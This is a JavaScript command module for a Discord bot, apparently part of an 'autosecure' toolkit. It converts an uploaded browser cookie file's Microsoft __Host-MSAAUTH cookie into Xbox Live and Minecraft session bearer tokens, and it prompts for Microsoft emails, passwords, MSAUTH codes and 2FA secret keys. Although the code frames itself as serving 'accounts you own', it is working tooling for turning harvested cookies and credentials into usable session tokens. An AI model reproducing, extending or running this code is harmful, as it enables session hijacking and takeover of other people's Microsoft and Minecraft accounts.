const {
  ActionRowBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  EmbedBuilder,
  ApplicationCommandOptionType
} = require('discord.js');
const axios = require('axios');
const HttpClient = require("../../../autosecure/utils/process/HttpClient");
const xbl = require("../../../autosecure/utils/minecraft/xbl");
const ssid = require('../../../autosecure/utils/minecraft/ssid');
const profile = require('../../../autosecure/utils/minecraft/profile');

module.exports = {
  name: "getssid",
  description: "Generate a SSID for a Minecraft Account.",
  userOnly: true,
  options: [
    {
      name: "options",
      description: "Select the right method for you",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        { name: "MSAUTH", value: "msauth" },
        { name: "Cookie File", value: "cookie" },
        { name: "Have none of these?", value: "manual" }
      ]
    },
    {
      name: "file",
      description: "Cookie file (required for cookie method)",
      type: ApplicationCommandOptionType.Attachment,
      required: false
    }
  ],

  callback: async (client, interaction) => {
    const optionChosen = interaction.options.getString('options');
    const fileAttachment = interaction.options.getAttachment('file');

    if (optionChosen === 'manual') {
      return interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(0xB8D2F0)
            .setDescription(
              "Use this guide to manually get Minecraft SSID (Bearer Token) for each account you own (takes ~20-30 seconds):\nhttps://kqzz.github.io/mc-bearer-token/"
            )
        ],
        ephemeral: true
      });
    }

    if (optionChosen === 'cookie') {
      if (!fileAttachment) {
        return interaction.reply({
          embeds: [
            new EmbedBuilder()
              .setColor(0xff0000)
              .setTitle("Error :x:")
              .setDescription("Please upload a cookie file when using the cookie method.")
          ],
          ephemeral: true
        });
      }

      try {
        await interaction.deferReply({ ephemeral: true });

        const response = await axios.get(fileAttachment.url);
        const cookieContent = response.data;
        const cookieLines = cookieContent.split('\n');

        function extractmsauth(cookieName) {
          const index = cookieLines.findIndex(line => line.includes(cookieName));
          if (index !== -1) {
            const parts = cookieLines[index].split('\t');
            if (parts.length >= 7) {
              let token = parts[6].trim();
              let nextLineIndex = index + 1;
              while (nextLineIndex < cookieLines.length) {
                const nextLine = cookieLines[nextLineIndex];
                if (nextLine.includes('login.live.com') || nextLine.trim() === '') {
                  break;
                }
                token += nextLine.trim();
                nextLineIndex++;
              }
              return token;
            }
          }
          return null;
        }

        const msauthToken = extractmsauth('__Host-MSAAUTHP') || extractmsauth('__Host-MSAAUTH');
        if (!msauthToken) {
          return interaction.editReply({
            embeds: [
              new EmbedBuilder()
                .setColor(0xff0000)
                .setTitle("Error :x:")
                .setDescription("Failed to find the necessary cookies in this file!")
            ],
            ephemeral: true
          });
        }

        const HttpClientfix = new HttpClient();
        HttpClientfix.setCookie(`__Host-MSAAUTH=${msauthToken}`);

        const xblresponse = await xbl(HttpClientfix);
        if (!xblresponse?.XBL) {
          return interaction.editReply({
            embeds: [
              new EmbedBuilder()
                .setColor(0xff0000)
                .setTitle("Error :x:")
                .setDescription("Failed Auth [Possibly no XBOX Profile]!")
            ],
            ephemeral: true
          });
        }

        const sid = await ssid(xblresponse.XBL);
        if (!sid) {
          return interaction.editReply({
            embeds: [
              new EmbedBuilder()
                .setColor(0xff0000)
                .setTitle("Error :x:")
                .setDescription("Couldn't get the SSID (Maybe the user doesn't have Minecraft)")
            ],
            ephemeral: true
          });
        }

        const userProfile = await profile(sid);
        if (!userProfile?.name || !userProfile?.uuid) {
          return interaction.editReply({
            embeds: [
              new EmbedBuilder()
                .setColor(0xff0000)
                .setTitle("Error :x:")
                .setDescription("Account doesn't have Minecraft or profile data is incomplete!")
            ],
            ephemeral: true
          });
        }

        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setColor(0xB8D2F0)
              .setTitle(userProfile.name)
              .setDescription(`\`\`\`${sid}\`\`\``)
          ],
          ephemeral: true
        });

      } catch (error) {
        console.error('Error processing cookie file:', error);
        return interaction.editReply({
          embeds: [
            new EmbedBuilder()
              .setColor(0xff0000)
              .setTitle("Error :x:")
              .setDescription(`Error processing cookie file: ${error.message}`)
          ],
          ephemeral: true
        });
      }
    } else {
      const modal = new ModalBuilder()
        .setCustomId(`handlegetssid|${optionChosen}`)
        .setTitle(`Get SSID - ${optionChosen.toUpperCase()}`);

      const emailInput = new TextInputBuilder()
        .setCustomId('email')
        .setLabel('Microsoft Email')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('user@example.com')
        .setRequired(true);

      const passwordInput = new TextInputBuilder()
        .setCustomId('password')
        .setLabel('Microsoft Password')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('Your password')
        .setRequired(true);

      switch (optionChosen) {
        case 'emailpass':
          modal.addComponents(
            new ActionRowBuilder().addComponents(emailInput),
            new ActionRowBuilder().addComponents(passwordInput)
          );
          break;

        case 'msauth':
          modal.addComponents(
            new ActionRowBuilder().addComponents(
              new TextInputBuilder()
                .setCustomId('authcode')
                .setLabel('MSAUTH Code')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Paste your MSAUTH code here')
                .setRequired(true)
            )
          );
          break;

        case 'tfa':
          modal.addComponents(
            new ActionRowBuilder().addComponents(emailInput),
            new ActionRowBuilder().addComponents(passwordInput),
            new ActionRowBuilder().addComponents(
              new TextInputBuilder()
                .setCustomId('secretkey')
                .setLabel('2FA Secret Key')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Enter your 2FA secret key')
                .setRequired(true)
            )
          );
          break;
      }

      await interaction.showModal(modal);
    }
  }
};
